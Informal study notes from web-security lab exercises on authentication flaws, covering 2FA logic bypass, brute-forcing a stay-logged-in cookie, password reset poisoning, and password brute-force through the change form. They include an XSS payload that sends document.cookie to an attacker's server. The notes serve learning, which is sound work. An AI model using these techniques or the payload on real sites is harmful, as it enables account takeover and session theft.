# **Vulnerabilities in multi-factor authentication:**

Once logged-in without providing 2fa code user might be able to access other page with only providing the passwrod.

And in some websites, the servers will use same cookie for all users, where it changes only username in that cookie according to the user. We can use this as a flawed mfa.

## **Lab: 2FA broken logic**

Here first we login using our own credentials in POST:/login (cookie : session-username)

Then we get GET:/login2 (cookie : session-username) → Here even if we remove session and only put username we will go to this page, so we can modify the username to victim username here

Then once we go to emailclient and get out mfa code and paste it here

We POST:/login2 (cookie : session-username, mfa-code:$1332$) →  Here even if we remove session and only put username we will go to this page, so we can modify the username to victim username here to go to main authenticated page.

But to go to main authenticated page we need to bruteforce mfa code 4 digit number, can do it by burp-intruder. For once request with username:victim, and proper mfacode you’ll get 302 status. From that response fetch the proper session.

And in website while loggin in your main page with your credential, just change the session cookie and reload the page. BOommm!!!

# Vulnerabilities in other mechanisms:

Some websites put this robust mechanisms only in login/signup page, but not in password reset page.

**Keeping users logged in →** Here some websites generate temporary cookie session to store permanently to keep the user logged in even after closing the browser. That temporary cookie should be random, but misconfigured-websites will generate this cookie based on the username-timestamp-password.  If attacker understands the formula of this in his own account, he can generate the cookie for his victim’s account.

## **Lab: Brute-forcing a stay-logged-in cookie:**

Here when we check with our login credentials, we logged in and clicked stay-logged in option.

Then we intercepted our request in burp, there is an additional cookie → set-session cookie: while decoding it in base64 it gives username:salt-hash , while cracking that hash in crackstation MD5 → it gives exact password. 

So this cookie can be bruteforced

After login using our credentials, we will receive response GET:/myaccount page → here remove 

cookie : set-logged-session=somevalue1; session=somevalue2;

pass this to intruder by cookie : set-logged-session=$somevalue1$; session= (as session will be setted by itself)

In intruder paste password in payloads and apply rules as per the encrypted formula. And start the attack

## XSS attack in common webpages of a web-app to fetch cookie

Attacker and victim, share same webpage with xss vulnerability. Each user have separate server to view their log. Attacker can post in xss comments attack like <script>

```bash
<script>document.location="attacker's server ip"+document.cookie</script>
```

When victim go through this attack, his cookie will be stored in attacker’s server.

### **Lab: Password reset broken logic**

Can login with known credentials

Then give password reset: in your account, you’ll get email. 

In that email update new and confirm password and send it to burp intruder.

Websites might have temp-password-code in the previous request, and in this request.

And also send temp-password-code as parameter, some misconfigured servers only check the given temp-password-code and parameter is same, but not they contain original valid codes.

Can use this and change the code, and provide victim username and desired password.

### **Lab: Password reset poisoning via middleware**

If the url for password reset is generating dynamically, this is also vulnerable. As some attacker can steal the victim-specific url and change their password .

lab:

Can login with known credentials

Then give password reset: in your account, you’ll get email.  → In this request, origin id will be sent, and it’ll be victim’s account id. But here we can add X-Forwarded-Host and given our exploit server’s id

Then link will go to victim, but once he clicks that link → cookie along with next request will come to attacker’s server which is passed as X-Forwarded-Host

## **Lab: Password brute-force via password change**

while password resetting in current ac → username, current pw, new password1, confirm password1 will go as request.

If new password and confirm password are different and current pw is correct: “New passwords dont match” error will occur

IF new password and confirm password are different and current pw is incorrect: “Current password is incorrect” error will occur, by this we can brute force current pw
